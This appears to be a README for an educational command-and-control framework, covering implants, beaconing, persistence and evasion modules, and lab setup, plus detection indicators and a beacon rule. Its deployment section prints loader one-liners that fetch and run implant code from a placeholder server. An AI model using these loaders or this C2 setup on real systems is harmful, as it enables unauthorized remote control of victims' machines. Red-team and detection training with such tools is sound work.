# 🕶️ C2 Framework

<div align="center">

### Enterprise-Grade Command & Control Infrastructure

Educational Red Teaming • Detection Engineering • Malware Analysis • Lab Simulation

<br>

![Educational Purpose](https://img.shields.io/badge/Purpose-Educational%20Only-red?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational%20Use%20Only-yellow?style=for-the-badge)

</div>

---

> ## ⚠️ WARNING — EDUCATIONAL PURPOSE ONLY
>
> This framework is intended exclusively for:
>
> - Cybersecurity education
> - Malware analysis training
> - Authorized penetration testing
> - Red team simulations
> - Controlled lab environments
>
> Unauthorized use against systems you do not own or explicitly have permission to test is illegal and unethical.

---
<img width="1774" height="887" alt="ChatGPT Image May 15, 2026, 12_12_04 PM" src="https://github.com/user-attachments/assets/09e0978a-111b-48c5-b3c1-0b77e3b7c751" />

# 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Lab Setup Requirements](#-lab-setup-requirements)
- [Quick Start Guide](#-quick-start-guide)
- [Detailed Installation](#-detailed-installation)
- [Usage Guide](#-usage-guide)
- [Cross-Platform Deployment](#-cross-platform-deployment)
- [Detection & Defense](#-detection--defense)
- [Troubleshooting](#-troubleshooting)
- [Educational Modules](#-educational-modules)
- [Project Structure](#-project-structure)
- [Legal & Ethics](#-legal--ethics)
- [Contributing](#-contributing)
- [License](#-license)

---

# 🎯 Overview

This **C2 Framework** is an educational command-and-control simulation platform designed to demonstrate how modern post-exploitation infrastructure works in controlled cybersecurity labs.

The framework helps:
- Red Teamers
- Blue Teamers
- SOC Analysts
- Malware Analysts
- Students
- Cybersecurity Researchers

understand:
- Beaconing mechanisms
- Encrypted communications
- Persistence techniques
- Detection engineering
- Adversary tradecraft
- Incident response workflows

---

# ✨ Features

## 🧠 Core Capabilities

| Feature | Description | Status |
|---|---|---|
| Multi-Platform Agents | Windows / Linux / macOS | ✅ |
| HTTP/HTTPS C2 Channels | REST-based encrypted communications | ✅ |
| Real-Time Dashboard | Operator web console | ✅ |
| Multi-Agent Support | Simultaneous agent management | ✅ |
| Task Queue System | Async command execution | ✅ |
| File Transfer | Upload / Download simulation | ✅ |
| Persistence Modules | OS-specific persistence examples | ✅ |
| Screenshot Module | Educational remote screen capture | ✅ |

---

# 🔧 Technical Specifications

| Component | Technology |
|---|---|
| Backend | Flask REST API |
| Encryption | AES-256-GCM |
| Database | SQLite / MySQL |
| Dashboard | HTML5 + JavaScript |
| Communication | JSON over HTTP/HTTPS |
| Beaconing | Configurable jitter |

---

# 🏗️ Architecture

```text
┌────────────────────────────────────────────────────────────┐
│                    OPERATOR ZONE                           │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ┌──────────────┐      ┌──────────────┐                    │
│  │   Web UI     │◄────►│   CLI Tool   │                    │
│  │   Port 5000  │      │  (Optional)  │                    │
│  └──────┬───────┘      └──────────────┘                    │
│         │                                                  │
│         ▼                                                  │
│  ┌──────────────────────────────────────────────────────┐  │
│  │              C2 SERVER (Flask)                       │  │
│  │          Port 443 / 5000 (HTTPS/HTTP)               │  │
│  └──────────────────┬───────────────────────────────────┘  │
│                     │                                      │
└─────────────────────┼──────────────────────────────────────┘
                      │
                      ▼
┌────────────────────────────────────────────────────────────┐
│                  EDUCATIONAL LAB ZONE                      │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐              │
│  │ Windows VM │ │ Linux VM   │ │ macOS VM   │              │
│  └────────────┘ └────────────┘ └────────────┘              │
│                                                            │
│  Simulated Educational Agents:                             │
│  • Beaconing                                               │
│  • Task Retrieval                                          │
│  • Secure Communication                                    │
│  • Persistence Simulation                                  │
└────────────────────────────────────────────────────────────┘
```

---

# 🔄 Communication Flow

1. Agent Registration
2. Key Exchange
3. Beacon Check-In
4. Task Assignment
5. Result Submission

---

# 🖥️ Lab Setup Requirements

# Hardware Requirements

| Component | Minimum | Recommended |
|---|---|---|
| RAM | 8GB | 16GB |
| CPU | 2 Cores | 4+ Cores |
| Storage | 20GB | 50GB SSD |
| Network | Host-Only | Isolated VLAN |

---

# Operating Systems

## C2 Server
- Kali Linux 2024+
- Ubuntu 22.04+

## Target Systems
- Windows 10/11
- Ubuntu 20.04+
- macOS Ventura+

---

# 📦 Dependencies

```bash
Python 3.8+
Flask
Flask-CORS
Requests
PyCryptodome
```

---

# 🌐 Example Virtual Lab

```text
┌────────────────────────────────────────────┐
│            VIRTUALBOX LAB                  │
├────────────────────────────────────────────┤
│                                            │
│ [Kali Linux]    172.24.1.83                │
│ [Windows VM]    192.168.56.10              │
│ [Ubuntu VM]     192.168.56.11              │
│                                            │
│ Network: Host-Only / Bridged               │
└────────────────────────────────────────────┘
```

---

# 🚀 Quick Start Guide

# Step 1 — Clone Repository

```bash
git clone https://github.com/parrysecurity/C2-Framework.git

cd C2-Framework
```

---

# Step 2 — Install Dependencies

```bash
pip3 install flask flask-cors requests pycryptodome
```

---

# Step 3 — Start C2 Server

```bash
python3 c2_server_http.py
```

Expected:

```text
==================================================
C2 HTTP Server Started Successfully
==================================================
Dashboard: http://127.0.0.1:5000
API:       http://127.0.0.1:5000/api
==================================================
```

---

# Step 4 — Host Educational Payloads

```bash
cd payloads

python3 -m http.server 8000
```

---

# Step 5 — Access Dashboard

```text
http://127.0.0.1:5000
```

---

# 📥 Detailed Installation

# Kali / Ubuntu

```bash
sudo apt update

sudo apt install -y \
python3 \
python3-pip \
git \
openssl

pip3 install \
flask \
flask-cors \
requests \
pycryptodome
```

---

# Generate SSL Certificate

```bash
openssl req -x509 -newkey rsa:4096 -nodes \
-out cert.pem \
-keyout key.pem \
-days 365
```

---

# Verify Installation

```bash
python3 -c "import flask; print('Flask OK')"
```

---

# 📖 Usage Guide

# Agent Management

Features:
- Agent registration
- Online/offline tracking
- System metadata
- Command history

---

# Available Educational Commands

| Command | Description |
|---|---|
| whoami | Current user |
| ipconfig / ifconfig | Network configuration |
| systeminfo | OS information |
| dir / ls | Directory listing |
| tasklist / ps | Running processes |
| netstat -an | Network connections |

---

# API Example

```bash
curl -X POST http://127.0.0.1:5000/api/send_command \
-H "Content-Type: application/json" \
-d '{"agent_id":"demo","command":"whoami"}'
```

---

# 🔄 Cross-Platform Deployment

# Windows Educational Loader

```powershell
curl -o implant.py http://SERVER_IP:8000/windows_implant.py

python implant.py
```

---

# Linux/macOS Educational Loader

```bash
curl -s http://SERVER_IP:8000/implant.py | python3
```

---

# 🛡️ Detection & Defense

This project also teaches defensive concepts.

# Network Indicators

```yaml
Indicators:
  - Repeated HTTP POST requests
  - Beacon intervals with jitter
  - Suspicious User-Agent strings
  - JSON payloads to /api/beacon
```

---

# Host Indicators

## Windows
- Unusual Python processes
- Registry Run keys
- Scheduled Tasks

## Linux
- Suspicious crontab entries
- Unknown outbound connections
- Persistence scripts

---

# Example Detection Rule

```yaml
alert tcp $HOME_NET any -> $EXTERNAL_NET 5000 \
(msg:"Potential C2 Beacon";
 content:"/api/beacon";
 sid:1000001;)
```

---

# 🐛 Troubleshooting

| Issue | Cause | Solution |
|---|---|---|
| Connection Refused | Server offline | Start Flask server |
| Flask Module Missing | Dependency issue | pip3 install flask |
| Agents Offline | Firewall issue | Allow port 5000 |
| SSL Errors | Self-signed certificate | Use verify=False |

---

# Useful Debug Commands

```bash
sudo netstat -tlnp | grep 5000

curl http://localhost:5000/api/agents

tail -f logs/errors.log
```

---

# 📚 Educational Modules

| Module | Objective |
|---|---|
| Beaconing | Understand periodic callbacks |
| Encryption | Learn AES secure communication |
| Persistence | Study OS persistence mechanisms |
| Detection | Build Sigma/YARA rules |
| Evasion | Analyze anti-analysis concepts |

---

# 📁 Project Structure

```text
c2-framework/
│
├── README.md
├── LICENSE
├── setup.sh
│
├── c2_server_http.py
├── c2_server_https.py
├── c2_server_robust.py
│
├── payloads/
│   ├── windows_implant.py
│   ├── loader.ps1
│   ├── loader.bat
│   └── implant.sh
│
├── modules/
│   ├── crypto.py
│   ├── evasion.py
│   └── persistence.py
│
├── web/
│   ├── dashboard.html
│   ├── style.css
│   └── console.js
│
├── logs/
│
└── docs/
```

---

# ⚖️ Legal & Ethics

# ✅ Permitted Usage

- Educational labs
- Red team exercises
- Malware analysis
- Academic research
- Detection engineering

---

# ❌ Prohibited Usage

- Unauthorized access
- Production deployment
- Data theft
- Malicious activity
- Illegal operations

---

# Responsible Use

Always ensure:
- Written authorization
- Defined scope
- Isolated lab environment
- Compliance with local laws

---

# 🤝 Contributing

Contributions are welcome.

## Workflow

```bash
git checkout -b feature/new-feature

git commit -m "Add feature"

git push origin feature/new-feature
```

Then submit a Pull Request.

---

# 📄 License

```text
EDUCATIONAL USE ONLY LICENSE

This project is provided strictly for:
- Cybersecurity education
- Defensive research
- Authorized testing
- Controlled environments

Unauthorized usage is prohibited.
```

---

# 📚 Recommended Reading

- MITRE ATT&CK Framework
- Malware Analysis Techniques
- Detection Engineering
- Red Team Operations
- Blue Team Methodologies

---

# 📊 Project Status

```text
🟢 ACTIVE — Educational Research Project

Supported Platforms:
✅ Windows
✅ Linux
✅ macOS

Python Version:
✅ 3.8+
```

---

<div align="center">

# 🛡️ Learn Offense to Build Better Defense

Educational Research Project by ParrySecurity

⭐ Star the repository if you found it useful.

</div>
